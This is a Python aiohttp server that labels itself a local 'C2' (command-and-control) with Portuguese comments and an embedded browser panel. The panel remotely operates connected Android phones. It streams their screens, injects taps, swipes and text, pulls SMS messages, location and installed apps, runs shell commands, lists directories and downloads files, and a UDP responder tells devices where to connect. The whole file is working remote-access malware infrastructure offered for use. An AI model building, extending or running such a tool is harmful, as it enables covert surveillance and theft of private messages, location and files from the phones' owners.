# server.py - C2 local, porta unica 8080
# abre http://localhost:8080/ e cai no painel ja com token
import asyncio, base64, json, socket
from aiohttp import web, WSMsgType

TOKEN = "3f7cm0ygvhr5w8"
DEVS = {}
VIEW = {}

PAGE = r"""<!doctype html><meta charset=utf-8><title>aval</title>
<style>
body{margin:0;background:#111;color:#ddd;font:13px system-ui;display:flex;height:100vh}
#l{flex:1;display:flex;flex-direction:column;min-width:0}
#b{padding:4px;display:flex;gap:3px;flex-wrap:wrap;background:#1b1b1b}
button,select{background:#2b2b2b;color:#ddd;border:1px solid #444;padding:3px 6px;font-size:12px;cursor:pointer}
#i{flex:1;object-fit:contain;background:#000;min-height:0;cursor:crosshair}
#s{font:11px monospace;color:#f66;padding:2px 6px;min-height:13px}
#r{width:320px;border-left:1px solid #333;display:flex;flex-direction:column}
#g{flex:1;overflow:auto;font:11px monospace;white-space:pre-wrap;word-break:break-all;padding:5px}
#row{padding:5px;display:flex;gap:3px}
input{flex:1;background:#222;color:#ddd;border:1px solid #444;padding:4px}
</style>
<div id=l><div id=b>
<select id=d><option value="">-- aparelho --</option></select>
<button onclick="k(4)">Voltar</button><button onclick="k(3)">Home</button><button onclick="k(187)">Recentes</button>
<button onclick="c('shot',{on:true})">Print ON</button><button onclick="c('shot',{on:false})">Print OFF</button>
<button onclick="c('screen',{on:true})">Acordar</button><button onclick="c('info')">Info</button><button onclick="c('apps')">Apps</button>
<button onclick="c('sms')">SMS</button><button onclick="c('loc')">Local</button>
<button onclick="c('torch',{on:true})">Luz</button><button onclick="c('torch',{on:false})">Luz off</button>
</div><img id=i><div id=s></div>
<div id=row><input id=t placeholder="texto, $shell, /ls path, /dl path"><button onclick="send()">Enviar</button></div></div>
<div id=r><div id=row>Q<input id=q type=range min=15 max=90 value=42 oninput="c('q',{v:+this.value})"></div>
<div id=row>FPS<input id=f type=range min=1 max=15 value=8 oninput="c('fps',{v:+this.value})"></div><div id=g></div></div>
<script>
let w,inf={w:0,h:0},lf=0,sel='';
const T=new URLSearchParams(location.search).get('t')||'';
const i=document.getElementById('i'),g=document.getElementById('g'),s=document.getElementById('s'),d=document.getElementById('d');
const add=x=>{g.textContent+=x+"\n";g.scrollTop=g.scrollHeight};
function co(){w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
w.onopen=()=>add('[painel ok]');w.onclose=()=>{add('[caiu]');setTimeout(co,2000)};
w.onmessage=e=>{const m=JSON.parse(e.data);
if(m.k==='frame'){if(m.id!==sel)return;lf=Date.now();s.textContent='';i.src='data:image/jpeg;base64,'+m.d;return}
if(m.k==='devs'){const cur=d.value;d.innerHTML='<option value="">-- aparelho --</option>';
m.d.forEach(x=>{const o=document.createElement('option');o.value=x.id;o.textContent=x.id+' '+x.m+' b'+x.bat;d.appendChild(o)});
if(cur&&m.d.some(x=>x.id===cur))d.value=cur;if(!sel&&m.d.length)s.textContent='selecione o aparelho';return}
if(m.k==='log'){const x=m.d;if(x.t==='hello'){inf=x;add('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip)}else add(x.t+': '+(x.o||''))}}
setInterval(()=>{if(!lf||Date.now()-lf>2500)s.textContent=sel?'sem frames':'nenhum aparelho selecionado'},1000);
d.onchange=()=>{sel=d.value;lf=0;i.removeAttribute('src');add('[*] '+(sel||'nenhum'))};
function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
function k(n){c('key',{code:n})}
function send(){const e=document.getElementById('t'),v=e.value.trim();if(!v)return;
if(v[0]==='$')c('shell',{cmd:v.slice(1)});else if(v.startsWith('/ls '))c('ls',{p:v.slice(4)});
else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});else c('text',{s:v});e.value=''}
document.getElementById('t').onkeydown=e=>{if(e.key==='Enter')send()};
function pt(e){const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
return{x:Math.round((e.clientX-r.left)*nx/r.width*(inf.w?inf.w/nx:1)),y:Math.round((e.clientY-r.top)*ny/r.height*(inf.h?inf.h/ny:1))}}
let dn=null,t0=0;
i.onmousedown=e=>{dn=pt(e);t0=Date.now()};
i.onmouseup=e=>{if(!dn)return;const u=pt(e),m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
if(m<12&&Date.now()-t0>600)c('long',{x:u.x,y:u.y});else if(m<12)c('touch',{x:u.x,y:u.y});
else c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:260});dn=null};
co();
</script>"""

def ok(req):
    return req.query.get("t") == TOKEN

async def _s(ws, d):
    try:
        await ws.send_str(d)
    except Exception:
        pass

async def bcast(o):
    d = json.dumps(o)
    await asyncio.gather(*[_s(v, d) for v in list(VIEW)], return_exceptions=True)

async def devs():
    d = [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1)} for k, v in DEVS.items()]
    await bcast({"k": "devs", "d": d})

async def index(req):
    if not ok(req):
        raise web.HTTPFound("/?t=" + TOKEN)
    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")

async def phone(req):
    if not ok(req):
        return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        h = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text=("%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", h, TOKEN)))

    ws = web.WebSocketResponse(heartbeat=15, max_msg_size=0)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                b = base64.b64encode(m.data).decode()
                await asyncio.gather(*[_s(v, json.dumps({"k": "frame", "d": b, "id": dev}))
                                       for v, s in list(VIEW.items()) if s == dev],
                                     return_exceptions=True)
            elif m.type == WSMsgType.TEXT:
                try:
                    o = json.loads(m.data)
                except Exception:
                    o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
                    DEVS[dev] = {"ws": ws, "i": o}
                    print("+ %s (%d aparelhos)" % (dev, len(DEVS)))
                    await devs()
                await bcast({"k": "log", "d": o, "id": dev})
    except Exception as e:
        print("  ! erro em %s: %s" % (dev, e))
    finally:
        if dev and DEVS.get(dev, {}).get("ws") is ws:
            DEVS.pop(dev, None)
            print("- %s saiu" % dev)
            await devs()
    return ws

async def panel(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    ws = web.WebSocketResponse(heartbeat=15, max_msg_size=0)
    await ws.prepare(req)
    VIEW[ws] = None
    await devs()
    try:
        async for m in ws:
            if m.type != WSMsgType.TEXT:
                continue
            try:
                o = json.loads(m.data)
            except Exception:
                continue
            alvo = DEVS.get(o.get("id"))
            if not alvo:
                await _s(ws, json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
                continue
            VIEW[ws] = o.get("id")
            try:
                await alvo["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
            except Exception:
                pass
    except Exception:
        pass
    finally:
        VIEW.pop(ws, None)
    return ws

async def health(req):
    return web.json_response({"ok": True, "devices": list(DEVS)})

def local_ip(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 9))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()

async def udp_loop():
    loop = asyncio.get_event_loop()
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sk.bind(("0.0.0.0", 8089))
    except Exception as e:
        print("! udp 8089 indisponivel: %s" % e)
        return
    sk.setblocking(False)
    while True:
        try:
            data, addr = await loop.sock_recvfrom(sk, 64)
            if data.strip() == b"AVAL":
                msg = ("ws://%s:8080/ws?t=%s" % (local_ip(addr[0]), TOKEN)).encode()
                await loop.sock_sendto(sk, msg, addr)
        except Exception:
            await asyncio.sleep(0.2)

async def on_start(app):
    app["udp"] = asyncio.create_task(udp_loop())

def main():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", health)
    app.on_startup.append(on_start)
    print("=" * 46)
    print(" painel: http://localhost:8080/")
    try:
        for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
            if not ip.startswith("127."):
                print(" celular na mesma rede: http://%s:8080/" % ip)
    except Exception:
        pass
    print("=" * 46)
    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)

main()